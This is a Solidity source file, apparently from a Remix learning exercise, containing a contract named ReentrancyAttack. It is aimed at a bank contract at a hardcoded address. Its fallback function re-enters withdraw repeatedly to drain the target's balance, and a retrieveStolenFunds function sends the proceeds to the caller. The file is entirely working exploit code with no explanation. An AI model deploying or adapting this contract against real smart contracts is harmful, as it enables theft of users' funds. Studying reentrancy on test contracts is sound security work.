pragma solidity ^0.5.0;

contract targetInterface {
    function deposit() public payable;
    function withdraw(uint amount) public;
}

contract ReentrancyAttack {
    // On Remix on first trial there was an error on checksum address
    // I corrected it as suggested and it worked: 0x692a70D2e424a56D2C6C27aA97D1a86395877b3A
    targetInterface bankAddress = targetInterface(0x692a70D2e424a56D2C6C27aA97D1a86395877b3A);
    uint amount = 1 ether;
    
    function deposit() public payable {
        bankAddress.deposit.value(msg.value)();
    }
    
    function getTargetBalance() public view returns(uint) {
        return address(bankAddress).balance;
    }
    
    function attack() public payable {
        bankAddress.withdraw(msg.value);
    }
    
    function retrieveStolenFunds() public {
        msg.sender.transfer(address(this).balance);
    }
    
    function() external payable {
        if(address(bankAddress).balance >= msg.value) {
            bankAddress.withdraw(msg.value);
        }
    }
}
